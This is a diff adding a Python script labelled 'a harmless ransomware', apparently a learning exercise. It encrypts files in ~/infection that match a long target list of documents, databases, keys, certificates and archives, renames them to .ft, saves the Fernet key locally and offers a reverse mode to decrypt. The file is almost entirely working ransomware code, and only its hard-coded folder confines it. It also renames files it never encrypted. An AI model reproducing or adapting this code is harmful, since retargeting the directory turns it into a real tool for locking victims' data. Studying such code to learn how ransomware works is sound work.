@@ -1,0 +1,134 @@
+#! /usr/local/bin/python
+
+import argparse
+import os
+from os import path
+import re
+from cryptography.fernet import Fernet, InvalidToken
+
+def does_dir_exist(directory):
+    if path.exists(directory) and path.isdir(directory):
+        return True
+    return False
+
+def print_if_not_silent(message, silent):
+    if not silent:
+        print(message)
+    
+if __name__ == "__main__":
+    # Argparse is used to parse command line arguments.
+    parser = argparse.ArgumentParser(description="execute a harmless ransomware")
+    parser.add_argument(
+        "-v", "--version", action="version", version="%(prog)s 1.0" , help="show the version of the script"
+    )
+    parser.add_argument(
+        "-r", "--reverse", dest="reverse_key", help="reverse the encryption"
+    )
+    parser.add_argument(
+        "-s", "--silent", action="store_true", help="run in silent mode"
+    )
+    args = parser.parse_args()
+
+    # This script only affects files in the ~/infection directory.
+    directory = os.path.expanduser("~/infection")
+    if not does_dir_exist(directory):
+        print_if_not_silent(f"{directory} folder does not exist.", silent=args.silent)
+        exit(1)
+
+    # See README.md for the list of file extensions.
+    target_ext = [
+        ".123", ".jpeg", ".rb", ".602", ".jpg",
+        ".rtf", ".doc", ".js", ".sch", ".3dm",
+        ".jsp", ".sh", ".3ds", ".key", ".sldm",
+        ".3g2", ".lay", ".sldm", ".3gp", ".lay6",
+        ".sldx", ".7z", ".ldf", ".slk", ".accdb",
+        ".m3u", ".sln", ".aes", ".m4u", ".snt",
+        ".ai", ".max", ".sql", ".ARC", ".mdb",
+        ".sqlite3", ".asc", ".mdf", ".sqlitedb", ".asf",
+        ".mid", ".stc", ".asm", ".mkv", ".std",
+        ".asp", ".mml", ".sti", ".avi", ".mov",
+        ".stw", ".backup", ".mp3", ".suo", ".bak",
+        ".mp4", ".svg", ".bat", ".mpeg", ".swf",
+        ".bmp", ".mpg", ".sxc", ".brd", ".msg",
+        ".sxd", ".bz2", ".myd", ".sxi", ".c",
+        ".myi", ".sxm", ".cgm", ".nef", ".sxw",
+        ".class", ".odb", ".tar", ".cmd", ".odg",
+        ".tbk", ".cpp", ".odp", ".tgz", ".crt",
+        ".ods", ".tif", ".cs", ".odt", ".tiff",
+        ".csr", ".onetoc2", ".txt", ".csv", ".ost",
+        ".uop", ".db", ".otg", ".uot", ".dbf",
+        ".otp", ".vb", ".dch", ".ots", ".vbs",
+        ".der", ".ott", ".vcd", ".dif", ".p12",
+        ".vdi", ".dip", ".PAQ", ".vmdk", ".djvu",
+        ".pas", ".vmx", ".docb", ".pdf", ".vob",
+        ".docm", ".pem", ".vsd", ".docx", ".pfx",
+        ".vsdx", ".dot", ".php", ".wav", ".dotm",
+        ".pl", ".wb2", ".dotx", ".png", ".wk1",
+        ".dwg", ".pot", ".wks", ".edb", ".potm",
+        ".wma", ".eml", ".potx", ".wmv", ".fla",
+        ".ppam", ".xlc", ".flv", ".pps", ".xlm",
+        ".frm", ".ppsm", ".xls", ".gif", ".ppsx",
+        ".xlsb", ".gpg", ".ppt", ".xlsm", ".gz",
+        ".pptm", ".xlsx", ".h", ".pptx", ".xlt",
+        ".hwp", ".ps1", ".xltm", ".ibd", ".psd",
+        ".xltx", ".iso", ".pst", ".xlw", ".jar",
+        ".rar", ".zip", ".java", ".raw"
+    ]
+
+    if not args.reverse_key:
+        # Create encryption key
+        key = Fernet.generate_key()
+        # Save the key to a file
+        with open("key", "wb") as key_file:
+            key_file.write(key)
+        print_if_not_silent("Key saved at ./key", silent=args.silent)
+    else:
+        # Load the key
+        key = args.reverse_key
+
+    try:
+        fe = Fernet(key)
+    except ValueError:
+        print_if_not_silent("Invalid key.", silent=args.silent)
+        exit(1)
+
+    # Encrypt the files in the ~/infection directory
+    for file in os.listdir(directory):
+        full_path = os.path.join(directory, file)
+        if os.path.isfile(full_path):
+            ext = os.path.splitext(file)[1]
+            if not args.reverse_key:
+                # Encrypt the file data
+                if ext in target_ext:
+                    with open(full_path, "rb") as f:
+                        data = f.read()
+                    print_if_not_silent(f"Encrypting {file}...", silent=args.silent)
+                    encrypted_data = fe.encrypt(data)
+                    with open(full_path, "wb") as f:
+                        f.write(encrypted_data)
+                    print_if_not_silent("Done.", silent=args.silent)
+            else:
+                # Decrypt the file data
+                if ext == ".ft":
+                    with open(full_path, "rb") as f:
+                        data = f.read()
+                    print_if_not_silent(f"Decrypting {file}...", silent=args.silent)
+                    try:
+                        decrypted_data = fe.decrypt(data)
+                    except InvalidToken:
+                        print_if_not_silent(f"Invalid key for {file}. Decryption failed.", silent=args.silent)
+                        continue
+                    with open(full_path, "wb") as f:
+                        f.write(decrypted_data)
+                    print_if_not_silent("Done.", silent=args.silent)
+            if not args.reverse_key:
+                # Rename the file to add the .ft extension
+                if os.path.splitext(file)[1] != ".ft":
+                    os.rename(full_path, full_path + ".ft")
+                    print_if_not_silent(f"Renamed {file} to {file}.ft", silent=args.silent)
+            else:
+                # Rename the file to remove the .ft extension
+                if os.path.splitext(file)[1] == ".ft":
+                    os.rename(full_path, full_path[:-3])
+                    print_if_not_silent(f"Renamed {file} to {file[:-3]}", silent=args.silent)
+                    
